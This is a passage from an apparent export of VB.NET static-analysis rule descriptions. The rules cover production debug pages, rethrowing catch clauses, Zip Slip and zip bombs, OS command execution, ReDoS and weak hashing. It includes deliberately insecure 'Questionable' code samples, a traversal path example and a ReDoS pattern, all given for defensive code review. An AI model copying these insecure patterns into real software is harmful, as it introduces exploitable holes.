<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debug features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>If env.IsDevelopment()</code> to disable debug code.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>. No Issue is raised when those calls are disabled by <code>if
(env.IsDevelopment())</code>.</p>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            If env.IsDevelopment() Then
                app.UseDeveloperExceptionPage()
                app.UseDatabaseErrorPage()
            End If

            app.UseDeveloperExceptionPage()
            app.UseDatabaseErrorPage()
        End Sub
    End Class
End Namespace
</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Delivering code in production with debug features activated is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-06T12:16:59+0100,"<p>A <code>Catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>Catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    Throw
End Try
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    logger.LogError(e)
    Throw
End Try
</pre>
<p>or</p>
<pre>
Dim s As String = File.ReadAllText(fileName)
</pre>
<h2>Exceptions</h2>
<p>This rule will not generate issues for <code>Catch</code> blocks with just <code>Throw</code> inside if they are followed by a <code>Catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As IOException 'Compliant, if removed will change the logic
    Throw
Catch e As Exception 'Compliant, does more than just rethrow
    logger.LogError(e)
    Throw
End Try
</pre>",vbnet:S2737,vbnet,VB.NET,"<p>A <code>Catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>Catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    Throw
End Try
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As Exception
    logger.LogError(e)
    Throw
End Try
</pre>
<p>or</p>
<pre>
Dim s As String = File.ReadAllText(fileName)
</pre>
<h2>Exceptions</h2>
<p>This rule will not generate issues for <code>Catch</code> blocks with just <code>Throw</code> inside if they are followed by a <code>Catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
Dim s As String = """"
Try
    s = File.ReadAllText(fileName)
Catch e As IOException 'Compliant, if removed will change the logic
    Throw
Catch e As Exception 'Compliant, does more than just rethrow
    logger.LogError(e)
    Throw
End Try
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2018-12-11T09:17:08+0100,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Validate the full path of the extracted file against the full path of the directory where files are expanded.</p>
<ul>
  <li> the canonical path of the expanded file must start with the canonical path of the directory where files are extracted. </li>
  <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
</ul>
<p>Stop extracting the archive if any of its entries has been tainted with a directory traversal path.</p>
<p>Define and control the ratio between compressed and uncompress bytes.</p>
<p>Define and control the maximum allowed expanded file size.</p>
<p>Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.</p>
<h2>Questionable Code Example</h2>
<pre>
For Each entry As ZipArchiveEntry in archive.Entries
    ' entry.FullName could contain parent directory references "".."" and the destinationPath variable could become outside of the desired path
    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName))
    entry.ExtractToFile(destinationPath) ' Questionable, extracts the entry to a file

    Dim stream As Stream
    stream = entry.Open() ' Questionable, the entry is about to be extracted
Next
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",vbnet:S5042,vbnet,VB.NET,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Validate the full path of the extracted file against the full path of the directory where files are expanded.</p>
<ul>
  <li> the canonical path of the expanded file must start with the canonical path of the directory where files are extracted. </li>
  <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
</ul>
<p>Stop extracting the archive if any of its entries has been tainted with a directory traversal path.</p>
<p>Define and control the ratio between compressed and uncompress bytes.</p>
<p>Define and control the maximum allowed expanded file size.</p>
<p>Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.</p>
<h2>Questionable Code Example</h2>
<pre>
For Each entry As ZipArchiveEntry in archive.Entries
    ' entry.FullName could contain parent directory references "".."" and the destinationPath variable could become outside of the desired path
    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName))
    entry.ExtractToFile(destinationPath) ' Questionable, extracts the entry to a file

    Dim stream As Stream
    stream = entry.Open() ' Questionable, the entry is about to be extracted
Next
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",Expanding archive files is security-sensitive,[],CRITICAL,"['cert', 'cwe']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Security
Imports System.Diagnostics

Namespace N
    Class A
        Public Sub Foo(ByVal fileName As String, ByVal arguments As String, ByVal userName As String,
                       ByVal password As SecureString, ByVal domain As String, ByVal startInfo As ProcessStartInfo,
                       ByVal process As Process)
            Process.Start(fileName) ' Questionable
            Process.Start(fileName, arguments) ' Questionable
            Process.Start(fileName, userName, password, domain) ' Questionable
            Process.Start(fileName, arguments, userName, password, domain) ' Questionable
            Process.Start(startInfo) ' Ok, the ProcessStartInfo's FileName has already been highlighted elsewhere
            startInfo.FileName = fileName ' Questionable
            process.StartInfo.FileName = fileName ' Questionable. StartInfo is a ProcessStartInfo.
            startInfo = new ProcessStartInfo(fileName) ' Questionable
            startInfo = new ProcessStartInfo(fileName, arguments) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",vbnet:S4721,vbnet,VB.NET,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Security
Imports System.Diagnostics

Namespace N
    Class A
        Public Sub Foo(ByVal fileName As String, ByVal arguments As String, ByVal userName As String,
                       ByVal password As SecureString, ByVal domain As String, ByVal startInfo As ProcessStartInfo,
                       ByVal process As Process)
            Process.Start(fileName) ' Questionable
            Process.Start(fileName, arguments) ' Questionable
            Process.Start(fileName, userName, password, domain) ' Questionable
            Process.Start(fileName, arguments, userName, password, domain) ' Questionable
            Process.Start(startInfo) ' Ok, the ProcessStartInfo's FileName has already been highlighted elsewhere
            startInfo.FileName = fileName ' Questionable
            process.StartInfo.FileName = fileName ' Questionable. StartInfo is a ProcessStartInfo.
            startInfo = new ProcessStartInfo(fileName) ' Questionable
            startInfo = new ProcessStartInfo(fileName, arguments) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Runtime.Serialization
Imports System.Text.RegularExpressions
Imports System.Web

Namespace N
    Public Class RegularExpression
        Private Sub Foo(ByVal pattern As String, ByVal options As RegexOptions, ByVal matchTimeout As TimeSpan,
                        ByVal input As String, ByVal replacement As String, ByVal evaluator As MatchEvaluator)
            // All the following instantiations are Questionable. Validate the regular expression and matched input.
            Dim r As Regex = New System.Text.RegularExpressions.Regex(pattern)
            r = New System.Text.RegularExpressions.Regex(pattern, options)
            r = New System.Text.RegularExpressions.Regex(pattern, options, matchTimeout)

            // All the following static methods are Questionable.
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern)
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options)
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Match(input, pattern)
            System.Text.RegularExpressions.Regex.Match(input, pattern, options)
            System.Text.RegularExpressions.Regex.Match(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Matches(input, pattern)
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options)
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options, matchTimeout)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Split(input, pattern)
            System.Text.RegularExpressions.Regex.Split(input, pattern, options)
            System.Text.RegularExpressions.Regex.Split(input, pattern, options, matchTimeout)
        End Sub
    End Class
End Namespace
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4784,vbnet,VB.NET,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Runtime.Serialization
Imports System.Text.RegularExpressions
Imports System.Web

Namespace N
    Public Class RegularExpression
        Private Sub Foo(ByVal pattern As String, ByVal options As RegexOptions, ByVal matchTimeout As TimeSpan,
                        ByVal input As String, ByVal replacement As String, ByVal evaluator As MatchEvaluator)
            // All the following instantiations are Questionable. Validate the regular expression and matched input.
            Dim r As Regex = New System.Text.RegularExpressions.Regex(pattern)
            r = New System.Text.RegularExpressions.Regex(pattern, options)
            r = New System.Text.RegularExpressions.Regex(pattern, options, matchTimeout)

            // All the following static methods are Questionable.
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern)
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options)
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Match(input, pattern)
            System.Text.RegularExpressions.Regex.Match(input, pattern, options)
            System.Text.RegularExpressions.Regex.Match(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Matches(input, pattern)
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options)
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options, matchTimeout)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options)
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options, matchTimeout)

            System.Text.RegularExpressions.Regex.Split(input, pattern)
            System.Text.RegularExpressions.Regex.Split(input, pattern, options)
            System.Text.RegularExpressions.Regex.Split(input, pattern, options, matchTimeout)
        End Sub
    End Class
End Namespace
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()

    ' Review all instantiations of classes that inherit from HashAlgorithm, for example:
    Dim hashAlgo As HashAlgorithm = HashAlgorithm.Create() ' Questionable
    Dim hashAlgo2 As HashAlgorithm = HashAlgorithm.Create(""SHA1"") ' Questionable
    Dim sha As SHA1 = New SHA1CryptoServiceProvider() ' Questionable
    Dim md5 As MD5 = New MD5CryptoServiceProvider() ' Questionable

    ' ...
End Sub

Class MyHashAlgorithm
    Inherits HashAlgorithm ' Questionable

    ' ...
End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
